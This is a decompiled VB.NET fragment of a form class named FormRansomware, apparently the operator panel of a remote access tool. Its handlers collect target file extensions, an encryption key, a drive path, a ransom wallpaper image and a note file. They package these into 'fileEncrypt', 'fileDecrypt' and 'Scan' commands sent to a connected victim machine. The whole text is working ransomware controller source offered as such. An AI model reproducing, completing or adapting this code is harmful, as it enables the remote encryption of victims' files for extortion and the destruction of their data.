		' Token: 0x06000754 RID: 1876 RVA: 0x0003E8A0 File Offset: 0x0003CAA0
		Private Sub TextBox1_IconLeftClick(sender As Object, e As EventArgs)
			Try
				Try
					For Each obj As Object In Me.DataGridViewExtension.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Me.DataGridViewExtension.Rows.Remove(dataGridViewRow)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x06000755 RID: 1877 RVA: 0x0003E948 File Offset: 0x0003CB48
		Private Sub EnableBackground_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.EnableBackground.Checked
			If checked Then
				Me.Chose_Backgroundimage.Enabled = True
			Else
				Me.Chose_Backgroundimage.Enabled = False
			End If
		End Sub

		' Token: 0x06000756 RID: 1878 RVA: 0x0003E984 File Offset: 0x0003CB84
		Private Sub EnableTextDocument_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.EnableTextDocument.Checked
			If checked Then
				Me.Choose_Text.Enabled = True
			Else
				Me.Choose_Text.Enabled = False
			End If
		End Sub

		' Token: 0x06000757 RID: 1879 RVA: 0x0003E9C0 File Offset: 0x0003CBC0
		Private Sub Chose_Backgroundimage_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "Choose jpg"
					openFileDialog.Filter = "Jpg |*.jpg"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						FormRansomware.EncodingImage = File.ReadAllBytes(openFileDialog.FileName)
						Me.PictureBox_Background.Image = Image.FromFile(openFileDialog.FileName)
					Else
						Me.PictureBox_Background.Image = Nothing
						FormRansomware.EncodingImage = New Byte(-1) {}
						Me.EnableBackground.Checked = False
					End If
				End Using
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x06000758 RID: 1880 RVA: 0x0003EAA8 File Offset: 0x0003CCA8
		Private Sub Choose_Text_Click(sender As Object, e As EventArgs)
			Try
				Using openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.Title = "Choose txt"
					openFileDialog.Filter = "Txt |*.txt"
					openFileDialog.Multiselect = False
					Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
					If flag Then
						Dim text As String = File.ReadAllText(openFileDialog.FileName)
						FormRansomware.EncodingTXT = Convert.ToBase64String(Functions.Get_Byte(text))
						Me.DocumentPath.Text = New FileInfo(openFileDialog.FileName).Name
					Else
						Me.EnableTextDocument.Checked = False
						FormRansomware.EncodingTXT = ""
						Me.DocumentPath.Text = "--"
					End If
				End Using
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x06000759 RID: 1881 RVA: 0x0003EBA4 File Offset: 0x0003CDA4
		Public Shared Function BytesToSize(byteCount As Long) As String
			Dim array As String() = New String() { ",B", ",KB", ",MB", ",GB", ",TB", ",PB", ",EB" }
			Dim flag As Boolean = byteCount = 0L
			Dim result As String
			If flag Then
				result = "0"
			Else
				Dim num As Long = Math.Abs(byteCount)
				Dim num2 As Integer = Convert.ToInt32(Math.Floor(Math.Log(CDbl(num), 1024.0)))
				Dim num3 As Double = Math.Round(CDbl(num) / Math.Pow(1024.0, CDbl(num2)), 1)
				result = (CDbl(Math.Sign(byteCount)) * num3).ToString() + array(num2)
			End If
			Return result
		End Function

		' Token: 0x0600075A RID: 1882 RVA: 0x0003EC60 File Offset: 0x0003CE60
		Private Sub ReadExtension()
			Try
				Dim text As String = Conversions.ToString(Functions.RegistryGetValue("#ListExtension", ""))
				Dim flag As Boolean = text <> Nothing
				If flag Then
					Dim array As String() = text.Split(New String() { "*" }, StringSplitOptions.None)
					For Each text2 As String In array
						Dim flag2 As Boolean = text2.Length > 0
						If flag2 Then
							Me.DataGridViewExtension.Rows.Add(New Object() { text2 })
						End If
					Next
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600075B RID: 1883 RVA: 0x0003ED14 File Offset: 0x0003CF14
		Public Sub SaveExtension()
			Try
				Dim text As String = String.Empty
				Try
					For Each obj As Object In CType(Me.DataGridViewExtension.Rows, IEnumerable)
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim flag As Boolean = Not dataGridViewRow.IsNewRow
						If flag Then
							text = text + dataGridViewRow.Cells(0).Value.ToString() + "*"
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Functions.RegistrySetValue("#ListExtension", Conversions.ToString(text))
			Catch ex As Exception
				Console.WriteLine(ex.Message)
			End Try
		End Sub

		' Token: 0x0600075C RID: 1884 RVA: 0x0003EDEC File Offset: 0x0003CFEC
		Private Sub Crypt_Click(sender As Object, e As EventArgs)
			Try
				Dim dialogResult As DialogResult = MessageBox.Show("Are you sure you want to start encrypting files", "Ransomware!", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
				Dim flag As Boolean = dialogResult = DialogResult.Yes
				If flag Then
					Dim flag2 As Boolean = Me.DataGridViewExtension.Rows.Count = 0
					If flag2 Then
						MessageBox.Show("Please add the extension of the files you want to encrypt in the list", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
					Else
						Dim flag3 As Boolean = Operators.CompareString(Me.Encryptionkey.Text, Nothing, False) = 0
						If flag3 Then
							MessageBox.Show("Please add an encryption key", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
						Else
							Dim flag4 As Boolean = Operators.CompareString(Me.DocumentPath.Text, Nothing, False) = 0
							If flag4 Then
								MessageBox.Show("Please add an Text Document", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
							Else
								Dim text As String = String.Empty
								Try
									For Each obj As Object In CType(Me.DataGridViewExtension.Rows, IEnumerable)
										Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
										Dim flag5 As Boolean = Not dataGridViewRow.IsNewRow
										If flag5 Then
											text = text + dataGridViewRow.Cells(0).Value.ToString() + ","
										End If
									Next
								Finally
									Dim enumerator As IEnumerator
									If TypeOf enumerator Is IDisposable Then
										TryCast(enumerator, IDisposable).Dispose()
									End If
								End Try
								Dim msgPack As MsgPack = New MsgPack()
								msgPack.ForcePathObject("Packet").AsString = "fileEncrypt"
								msgPack.ForcePathObject("Extensions").AsString = text
								Dim checked As Boolean = Me.EnableBackground.Checked
								If checked Then
									Dim flag6 As Boolean = FormRansomware.EncodingImage.Length <= 0
									If flag6 Then
										MessageBox.Show("Please add a background image", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
										Return
									End If
									msgPack.ForcePathObject("Image").SetAsBytes(FormRansomware.EncodingImage)
								End If
								Dim checked2 As Boolean = Me.EnableTextDocument.Checked
								If checked2 Then
									Dim flag7 As Boolean = FormRansomware.EncodingTXT.Length <= 0
									If flag7 Then
										MessageBox.Show("Please add a text document", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
										Return
									End If
									msgPack.ForcePathObject("Txt").AsString = FormRansomware.EncodingTXT
								End If
								msgPack.ForcePathObject("Key").AsString = Me.Encryptionkey.Text
								msgPack.ForcePathObject("Path").AsString = Me.GetDriversComboBox.Text
								msgPack.ForcePathObject("IsImage").AsString = Conversions.ToString(Me.EnableBackground.Checked)
								msgPack.ForcePathObject("IsTXT").AsString = Conversions.ToString(Me.EnableTextDocument.Checked)
								ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
								Me.Crypt.Text = "Please wait ..."
								Me.Crypt.Enabled = False
								Me.State.ForeColor = Color.White
								Me.State.Text = "..."
								Me.FileEncrypError.Text = "..."
							End If
						End If
					End If
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x0600075D RID: 1885 RVA: 0x0003F160 File Offset: 0x0003D360
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.EncryptLogs.Rows.Count > 0
			If flag Then
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(Me.EncryptLogs.Rows(0).Cells(1).Value, "Encrypted", False) AndAlso Me.ProgressBar1.Value = 0
				If flag2 Then
					Me.Decrypt.Enabled = True
					Me.Decrypt.Text = "Decrypt"
					Me.StateFiles.Text = "Encrypted"
				Else
					Me.Decrypt.Text = "Decrypt"
					Me.Decrypt.Enabled = False
					Me.StateFiles.Text = "Decrypt done"
				End If
			Else
				Me.StateFiles.Text = "Nothing"
			End If
			Me.NumList.Text = "+" + Conversions.ToString(Me.EncryptLogs.Rows.Count)
			Me.NumProg.Text = Conversions.ToString(Me.ProgressBar1.Value) + "%"
		End Sub

		' Token: 0x0600075E RID: 1886 RVA: 0x0003F298 File Offset: 0x0003D498
		Private Sub Decrypt_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				Dim flag As Boolean = Operators.CompareString(Me.Encryptionkey.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please add an encryption key", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Dim checked As Boolean = Me.EnableBackground.Checked
					If checked Then
						Dim flag2 As Boolean = FormRansomware.DecryptImage.Length <= 0
						If flag2 Then
							MessageBox.Show("Please add a background image", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
							Return
						End If
					End If
					Dim checked2 As Boolean = Me.EnableTextDocument.Checked
					If checked2 Then
						Me.EnableTextDocument.Checked = False
					End If
					msgPack.ForcePathObject("Packet").AsString = "fileDecrypt"
					msgPack.ForcePathObject("Image").SetAsBytes(FormRansomware.DecryptImage)
					msgPack.ForcePathObject("Key").AsString = Me.Encryptionkey.Text
					msgPack.ForcePathObject("Path").AsString = Me.GetDriversComboBox.Text
					msgPack.ForcePathObject("IsImage").AsString = Conversions.ToString(Me.EnableBackground.Checked)
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.Crypt.Enabled = False
					Me.Decrypt.Text = "Please wait ..."
					Me.Decrypt.Enabled = False
					Me.State.ForeColor = Color.White
					Me.State.Text = "..."
					Me.FileEncrypError.Text = "..."
					Me.EncryptLogs.Rows.Clear()
				End If
			Catch ex As Exception
				MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			End Try
		End Sub

		' Token: 0x0600075F RID: 1887 RVA: 0x0003F494 File Offset: 0x0003D694
		Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs)
			e.Handled = ((e.KeyChar = "\"c OrElse Functions.CheckPathChard(e.KeyChar.ToString())) AndAlso Not Char.IsControl(e.KeyChar))
		End Sub

		' Token: 0x06000760 RID: 1888 RVA: 0x0003F4D9 File Offset: 0x0003D6D9
		Private Sub KeyComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Me.Encryptionkey.Text = Conversions.ToString(Me.ReadKey(Me.KeyComboBox1.Text.Split(New Char() { ":"c })(1)))
		End Sub

		' Token: 0x06000761 RID: 1889 RVA: 0x0003F510 File Offset: 0x0003D710
		Private Sub GetDriversComboBox_SelectedIndexChanged(sender As Object, e As EventArgs)
			Try
				Me.EncryptLogs.Rows.Clear()
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Scan"
				msgPack.ForcePathObject("Path").AsString = Me.GetDriversComboBox.Text
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.Crypt.Enabled = False
				Me.Decrypt.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000762 RID: 1890 RVA: 0x0003F5C0 File Offset: 0x0003D7C0
		Private Sub FileEncrypError_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Me.FileEncrypError.Text = "..."
			Me.FileEncrypError.LinkColor = Color.White
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Scan"
				msgPack.ForcePathObject("Path").AsString = Me.GetDriversComboBox.Text
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.Crypt.Enabled = False
				Me.Decrypt.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000763 RID: 1891 RVA: 0x0003F680 File Offset: 0x0003D880
		Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = e.KeyCode = Keys.[Return]
			If flag Then
				Me.TextBox1.Focus()
				Me.AddExtension()
			End If
		End Sub

		' Token: 0x06000764 RID: 1892 RVA: 0x0003F6B1 File Offset: 0x0003D8B1
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x04000355 RID: 853
		Public FormSize As Boolean

		' Token: 0x04000356 RID: 854
		Public IsConnected As Boolean

		' Token: 0x04000357 RID: 855
		Public Shared EncodingImage As Byte()

		' Token: 0x04000358 RID: 856
		Public Shared DecryptImage As Byte()

		' Token: 0x04000359 RID: 857
		Public Shared EncodingTXT As String
	End Class
End Namespace
